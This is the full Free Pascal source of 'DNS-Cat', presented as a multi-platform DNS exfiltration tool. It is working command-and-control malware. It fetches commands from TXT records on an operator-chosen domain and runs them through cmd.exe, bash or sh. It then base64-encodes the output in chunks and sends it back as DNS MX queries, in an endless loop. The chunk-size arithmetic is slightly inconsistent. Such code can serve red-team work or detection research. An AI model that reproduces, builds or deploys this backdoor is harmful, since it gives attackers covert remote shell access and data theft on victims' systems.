{

    

,------.  ,--.  ,--. ,---.         ,-----.          ,--.
|  .-.  \ |  ,'.|  |'   .-',-----.'  .--./ ,--,--.,-'  '-.
|  |  \  :|  |' '  |`.  `-.'-----'|  |    ' ,-.  |'-.  .-'
|  '--'  /|  | `   |.-'    |      '  '--'\\ '-'  |  |  |
`-------' `--'  `--'`-----'        `-----' `--`--'  `--'


 * Source is provided to this software because we believe users have a     *
 * right to know exactly what a program is going to do before they run it. *
 * This also allows you to audit the software for future improvements.     *
 *                                                                         *
 * Source code also allows you to port DNS-Cat to new platforms, fix bugs  *
 * and add new features. You are highly encouraged to send your changes    *
 * to the admin@0xsp.com                                                   *
 *                                                                         *
 *                                                                         *
 *  This program is distributed in the hope that it will be useful,        *
 *  but WITHOUT ANY WARRANTY; without even the implied warranty of         *
 *  MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.                   *
 *                                                                         *
 *  #Author : Lawrence Amer   @zux0x3a
 *  #LINKS : https://0xsp.com
 *                                                                         *
}


program project1;

{$mode objfpc}{$H+}

uses
  {$IFDEF UNIX}{$IFDEF UseCThreads}
  cthreads,
  {$ENDIF}{$ENDIF}
  Classes, SysUtils,
  {$IFDEF Windows}
  windows,
  {$IFEND}
  CustApp,dnssend,process,base64;

type

  { TMyApplication }

  TDNSCAT = class(TCustomApplication)
  protected
    procedure DoRun; override;
  public
    constructor Create(TheOwner: TComponent); override;
    destructor Destroy; override;
    procedure WriteHelp; virtual;
    procedure DNS; virtual;
    procedure TXTvalueQuery; virtual;
  end;

  var
    status : Boolean;
    i_host : string;

{ TMyApplication }

procedure TDNSCAT.DoRun;
var
  ErrorMsg: String;
begin
  // quick check parameters
  ErrorMsg:=CheckOptions('h', 'host');
  if ErrorMsg<>'' then begin
    ShowException(Exception.Create(ErrorMsg));
    Terminate;
    Exit;
  end;

  // parse parameters
  if HasOption('h', 'host') then begin

    DNS;

  end;

  { add your program here }
    if ParamCount < 1 then begin

      writehelp;

    end;
  // stop program loop
  Terminate;
end;

constructor TDNSCAT.Create(TheOwner: TComponent);
begin
  inherited Create(TheOwner);
  StopOnException:=True;
end;

destructor TDNSCAT.Destroy;
begin
  inherited Destroy;
end;

{$IFDEF Windows}   // check env if windows only
function SystemFolder: string;
begin
  SetLength(Result, Windows.MAX_PATH);
  SetLength(
    Result, Windows.GetSystemDirectory(PChar(Result), Windows.MAX_PATH)
  );
end;
{$IFEND}
procedure TDNSCAT.TXTvalueQuery;
var
  l:tstringlist;
  DNSd: TDNSSend;
begin
  status := false;
  DNSd := TDNSSend.Create;
  l := Tstringlist.create;
  DNSd.TargetHost := i_host;
  sleep(1000);
  DNSd.DNSQuery('test.'+i_host, QTYPE_TXT, l);
  if length(l.text) > 0 then begin
    DNSd.DNSQuery('test.'+i_host, QTYPE_AAAA, l)
  end else
  status := true;
end;




// blowfish encryption support
{
function encrypt(data:string):string;
var
  en: TBlowFishEncryptStream;
  //de: TBlowFishDeCryptStream;
  s1,s2: TStringStream;
  key: String;
begin
    key := '0xspdnskey';
    s1 := TStringStream.Create('');
    en := TBlowFishEncryptStream.Create(key,s1);
    en.WriteAnsiString(data);
    en.Free;
    result:=s1.datastring;
end;
  }


function exfiltrate(str:string):string;
var
  l:tstringlist;
  DNSd: TDNSSend;
  NumElem, i ,Len:Integer;
  Arr: array of String;
begin

     DNSd := TDNSSend.Create;
      l := Tstringlist.Create;
     Len := Length(str);

    // Calculate how many full elements we need
    NumElem := Len div 30;
    // Handle the leftover content at the end
    if Len mod 10 <> 0 then
      Inc(NumElem);
      SetLength(Arr, NumElem);

    // Extract the characters from the string, 10 at a time, and
    // put into the array. We have to calculate the starting point
    // for the copy in the loop (the i * 30 + 1).
    for i := 0 to High(Arr) do
      Arr[i] := Copy(Str, i * 30 + 1, 30);


   // Send data into DNS server as Chunks
   for i := 0 to High(Arr) do begin

  DNSd.TargetHost := i_host;
  DNSd.DNSQuery(encodestringbase64(Arr[i])+'.'+i_host, QType_MX, l);
  writeln('[+]Shell command results has been sent -> ');
end;

   //it is not urgent to free dns component or stringlist in our code case

end;

procedure TDNSCAT.DNS;
var
  p2: tstringlist;
  str: string;
  DNSd: TDNSSend;
  y: Integer;

begin

  for y := 1 to paramcount do begin
      if (paramstr(y)='-h') then begin
        i_host := paramstr(y+1);
      end;

  end;

  status := false;
  p2 := Tstringlist.Create;
  TXTvalueQuery;   // Query an active dns server for txt value to pass as valid command
  DNSd := TDNSSend.Create;
  DNSd.TargetHost := i_host;

  if DNSd.DNSQuery('live.'+i_host, QTYPE_TXT, p2) then
   writeln(length('[!] DNS Query Length: '+p2.text)); // length of accepted DNS query
   if length(p2.text) > 1 then
  writeln('[+] Yo! Command captured  <-'+p2.text);
   {$IFDEF Windows} // for windows env
  RunCommand(systemfolder+'\cmd.exe',['/c',p2.text],str);
   {$IFEND}
   {$IFDEF linux}   //for Linux env
    RunCommand('/bin/bash',['-c',p2.text],str);
   {$IFEND}
   {$IFDEF darwin}
    RunCommand('/bin/sh',['-c',p2.text],str);
   {$IFEND}

  exfiltrate(str); // send command results into dns server

  status := true; // Bool value
 while status do begin    // loop case

     DNS

 end;

end;





procedure TDNSCAT.WriteHelp;
begin

  writeln('[!] DNS-CAT Exfiltration Multi-platform Tool v1.1');
  writeln('[*] supports : Windows , Linux , Macos ..');
  writeln('by : @zux0x3a <> 0xsp.com ');
  writeln(' ');
  writeln('Usage: ', ExeName, ' -h DOMAIN_NAME');
end;

var
  Application: TDNSCAT;
begin
  Application:=TDNSCAT.Create(nil);
  Application.Title:='DNS-Cat';
  Application.Run;
  Application.Free;
end.

